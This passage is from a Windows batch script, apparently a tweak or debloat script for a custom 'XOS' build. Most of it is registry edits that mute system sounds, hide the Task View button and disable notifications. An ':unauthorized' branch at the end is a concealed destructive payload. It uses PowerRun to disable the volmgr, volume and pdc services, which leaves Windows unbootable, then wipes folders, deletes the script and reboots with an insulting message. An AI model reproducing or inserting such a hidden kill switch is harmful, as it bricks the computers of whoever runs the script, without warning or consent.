Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowTaskViewButton" /t REG_DWORD /d "0" /f
cls

echo disable suggested actions
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SmartActionPlatform\SmartClipboard" /v "Disabled" /t REG_DWORD /d "1" /f
cls

echo disabling windows sounds
Reg.exe add "HKCU\AppEvents\Schemes" /ve /t REG_SZ /d ".None" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\.Default\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\AppGPFault\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\AppGPFault\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\CCSelect\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\CCSelect\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ChangeTheme\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ChangeTheme\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Close\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Close\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\CriticalBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\CriticalBatteryAlarm\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceFail\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceFail\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\FaxBeep\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\FaxBeep\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\LowBatteryAlarm\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\LowBatteryAlarm\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MailBeep\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MailBeep\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Maximize\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Maximize\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MenuCommand\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MenuCommand\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MenuPopup\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MenuPopup\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MessageNudge\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\MessageNudge\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Minimize\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Minimize\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Default\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Default\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.IM\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.IM\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Mail\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Mail\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Proximity\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Proximity\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Reminder\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.Reminder\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.SMS\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Notification.SMS\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Open\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\Open\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\PrintComplete\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\PrintComplete\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ProximityConnection\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ProximityConnection\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreDown\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreDown\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreUp\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\RestoreUp\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ShowBand\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\ShowBand\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemAsterisk\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemAsterisk\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExclamation\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemExclamation\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemHand\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemHand\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemNotification\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemNotification\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemQuestion\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\SystemQuestion\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsUAC\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\.Default\WindowsUAC\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\ActivatingDocument\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\ActivatingDocument\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\BlockedPopup\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\BlockedPopup\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\EmptyRecycleBin\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\EmptyRecycleBin\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\FeedDiscovered\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\FeedDiscovered\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\MoveMenuItem\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\Navigating\.Current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\Navigating\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\SecurityBand\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\Explorer\SecurityBand\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\DisNumbersSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\DisNumbersSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubOffSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubOffSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubOnSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubOnSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubSleepSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\HubSleepSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\MisrecoSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\MisrecoSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\PanelSound\.current" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Apps\sapisvr\PanelSound\.None" /ve /t REG_SZ /d "" /f
Reg.exe add "HKCU\AppEvents\Schemes\Names\.None" /ve /t REG_SZ /d "No Sounds" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\BootAnimation" /v "DisableStartupSound" /t REG_DWORD /d "0" /f
cls

echo troubleshooting recommended - dont run any
Reg.exe add "HKLM\Software\Microsoft\WindowsMitigation" /v "UserPreference" /t REG_DWORD /d "1" /f
cls

echo disabling notification center
sc config WpnService start=disabled > nul 2>&1
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f > nul
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND" /t REG_DWORD /d "0" /f > nul
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f > nul
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoCloudApplicationNotification" /t REG_DWORD /d "1" /f > nul
cls

echo removing leftovers
Reg.exe delete "HKLM\Software\Microsoft\Active Setup\Installed Components\{12A3E74D-AA55-3F50-85F0-B9340EA4F43F}" /f
Reg.exe delete "HKLM\Software\Microsoft\Active Setup\Installed Components\{3af36230-a269-11d1-b5cf-0000f8051515}" /f
Reg.exe delete "HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C14F79FAA6}" /f
Reg.exe delete "HKCU\Software\Microsoft\Active Setup\Installed Components\{12A3E74D-AA55-3F50-85F0-B9340EA4F43F}" /f
Reg.exe delete "HKCU\Software\Microsoft\Active Setup\Installed Components\{3af36230-a269-11d1-b5cf-0000f8051515}" /f
Reg.exe delete "HKCU\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C14F79FAA6}" /f
del /f C:\ProgramData\Microsoft\Windows\SystemData\setup.7z
cls


echo %date% - %time% Script finished successfully >> C:\log.txt

echo del /f "C:\Program Files\Internet Explorer\iesetup.exe" >> C:\Leftover.bat
echo del /f /q "C:\Leftover.bat" >nul 2>&1 >> C:\Leftover.bat
echo exit /b >> C:\Leftover.bat
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "Leftover" /t REG_SZ /d "C:\Leftover.bat" /f
cls

reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /f >nul 2>&1
shutdown -r -t 1 /c "Rebooting XOS"
start /b "" cmd /c del "%~f0"&exit /b
Exit

:unauthorized
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pdc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volmgr" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
PowerRun.exe /SW:0 Reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volume" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
rd /s /q "C:\Windows\Temp\" >nul 2>&1
rd /s /q "C:\$RECYCLE.BIN" >nul 2>&1
timeout /t 5 /nobreak >nul 2>&1
sc stop pdc
del /f /q "%~f0" >nul 2>&1
shutdown -r -t 5 /c "FUCK YOU SCAMMER"
exit /b